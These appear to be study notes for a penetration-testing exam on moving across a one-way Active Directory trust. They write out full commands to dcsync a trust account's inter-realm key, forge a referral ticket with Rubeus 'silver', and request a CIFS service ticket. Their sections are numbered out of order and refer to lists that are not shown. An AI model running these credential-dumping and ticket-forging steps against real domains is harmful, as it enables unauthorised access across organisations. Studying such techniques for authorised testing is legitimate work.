A one-way trust is created when administrators want to share resources with a trusted domain, but they don't want their resources to be accessed from the trusting domain

Querying the TDO shows an inbound transitive forest trust with _partner.com_.
```
getuid
You are CONTOSO/pchilds # THIS SHOWS THE DOMAIN NAME

ldapsearch (objectClass=trustedDomain)
trustDirection: 1
```
its 1, so its inbound and we can get access to resources in another domain.

If an adversary is on the side of the trusted domain, then they are with the direction of access and can therefore access resources in the trusting domain by design.  The strategy for this is to find and impersonate principals in the trusted domain that have been configured with legitimate access to resources in the trusting domain.  Golden tickets with SID history do not work in these cases because external trusts employ something called SID filtering.  The trusting domain will therefore ignore any SIDs that are not native to itself.

## Forging referral tickets

If you have credential material for an eligible principal, you can simply impersonate them, request access to a service, and rely on Windows to handle the ticket process in the background.  However, you can also manually forge inter-realm referral tickets using the inter-realm key.  When in the trusted domain, you can obtain this key by dumping the credentials for the associated trust account.
```
dcsync contoso.com CONTOSO\PARTNER$
```

These hashes can then be used with Rubeus' `silver` command.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
```

- `/user` is the username to impersonate.
- `/domain` is the FQDN of the trusted domain. (our domain)
- `/sid` is the SID of the trusted domain. 
- `/id` is the RID of the impersonated user.
- `/groups` are the RIDs of the impersonated user's domain groups.  _Domain Users_ is 513, _Workstation Admins_ is 1106, and _Partner Jump Users_ is 6102.
- `/service` is the krbtgt service of the trusting domain.
- `/rc4` is the inter-realm key.

>When forging tickets offline, make sure to get the user's group membership correct.  Don't rely on the default groups that Rubeus uses.  Alternatively, forge them 'online' with Rubeus' `/ldap` parameter.

This forged inter-realm TGT is then used to request service tickets from the trusting domain via Rubeus' `asktgs` command.
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:doIFM[...snip...]mNvbQ== /nowrap
```

Where:

- `/service` is the target service in the trusting domain.
- `/dc` is a domain controller in the trusting domain.
- `/ticket` is the inter-realm TGT.

1. Core concept
A one-way trust allows principals in one domain (the trusted domain) to access permitted resources in the other domain (the trusting domain). The trust direction determines which side can authenticate to the other; it does not automatically grant access to every resource.
In this example:
Trusted/source domain: `CONTOSO.COM`
Trusting/resource domain: `PARTNER.COM`
Trust direction: inbound to `PARTNER.COM` from `CONTOSO.COM`
Goal: identify Contoso users/groups that have been granted access in Partner, then determine what those principals can access.
> **Exam reminder:** Trust establishes an authentication path, not authorization. Actual access depends on group membership, ACLs, local group membership, and resource permissions.

8. SID filtering and common misconceptions
SID filtering: Trust boundaries can filter SIDs that are not valid for the relevant trust. Do not assume you can add arbitrary privileged SIDs from another domain and have them honored.
Trust ≠ admin: A trust alone does not grant access to a target host or share.
Foreign principal ≠ user only: A foreign security principal can represent a user or a group; resolve the SID.
Group membership ≠ effective permission: Confirm GPOs, local groups, ACLs, and service/resource permissions.
Correct domain matters: Keep the trusted domain, trusting domain, their SIDs, the target KDC, and the target SPN distinct.
Ticket type matters: Understand whether the artifact is a TGT/referral ticket or a service ticket (TGS); do not use the terms interchangeably.
9. Fast exam workflow
Run `getuid` and identify your current domain.
Enumerate `(objectClass=trustedDomain)` and determine the trust direction.
Query `foreignSecurityPrincipal` objects in the trusting domain.
Ignore the common well-known SIDs listed above; resolve remaining SIDs with `(objectSid=<SID>)`.
Identify foreign groups and enumerate where they receive access in the trusting domain.
Check effective permissions and likely target systems.
If the scenario specifically calls for referral-ticket forging, confirm the required trust key, domain SID, user RID, group RIDs, target KDC, and target SPN.
Request the target service ticket, inspect it with `klist`, and validate access to the authorized target resource.
